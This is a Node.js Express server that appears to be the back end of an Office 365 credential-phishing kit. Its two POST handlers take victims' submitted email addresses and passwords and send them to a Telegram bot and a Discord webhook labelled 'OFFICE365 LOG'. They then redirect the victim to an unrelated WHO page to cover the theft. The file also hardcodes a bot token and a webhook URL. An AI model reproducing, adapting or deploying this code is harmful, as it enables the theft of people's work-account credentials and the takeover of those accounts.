const express = require("express");
const bodyParser = require("body-parser");
const { EmbedBuilder, WebhookClient } = require("discord.js");
const XMLHttpRequest = require("xhr2");
// const fetch = require('node-fetch');

const token = "6083125051:AA5u466P-ux1G8mYWCazpVu2hi4k"; // your token here
const chat_id = 17968095; // Your chat Id here

const webhookClient = new WebhookClient({
  url: "https://discord.com/api/webhooks/1085332401544233101/QrAw0WjCDWvtyqk2x-gv9xksKQ_UGx1cGdlWfv304k5hoPZh4Nt74VFYzASUz7Ay9AQB",
});

const app = express();
console.log("hi");

app.use(bodyParser.urlencoded({ extended: true }));
app.set("view engine", "ejs");
app.use(express.static("public"));

app.get("/", (req, res) => {
  res.render("index");
});

app.get("/office", (req, res) => {
  res.render("office");
});

app.post("/", (req, res) => {
  const my_text = `Result is:%0A => EMAIL: ${req.body.email} %0A %0A => PASSWORD: ${req.body.password}`;

  // console.log(req.body.io, req.body.po)

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;

  let api = new XMLHttpRequest();
  api.open("GET", url, true);
  api.send();

  const embed = new EmbedBuilder()
    .setTitle("OFFICE365")
    .setDescription(
      `Result is:
   => EMAIL: ${req.body.email}

   => PASSWORD: ${req.body.password}`
    )

    .setColor(0x00ffff);

  webhookClient.send({
    content: "OFFICE365",
    username: "OFFICE365 LOG",
    avatarURL: "https://i.imgur.com/AfFp7pu.png",
    embeds: [embed],
  });

  res.redirect("office");
});

app.post("/office", (req, res) => {
  const my_text = `Result is:%0A => EMAIL: ${req.body.email} %0A %0A => Password: ${req.body.password}`;

  // console.log(req.body.lo, req.body.ui)

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;

  let api = new XMLHttpRequest();
  api.open("GET", url, true);
  api.send();

  const embed = new EmbedBuilder()
    .setTitle("OFFICE365")
    .setDescription(
      `Result is:
   => EMAIL: ${req.body.email}

   => PASSWORD: ${req.body.password}`
    )
    .setColor(0x00ffff);

  webhookClient.send({
    content: "OFFICE365",
    username: "OFFICE365 LOG",
    avatarURL: "https://i.imgur.com/AfFp7pu.png",
    embeds: [embed],
  });

  res.redirect(
    "https://www.who.int/emergencies/diseases/novel-coronavirus-2019/advice-for-public"
  );
});

app.listen(process.env.PORT || 3000, () => {
  console.log("server listening");
});
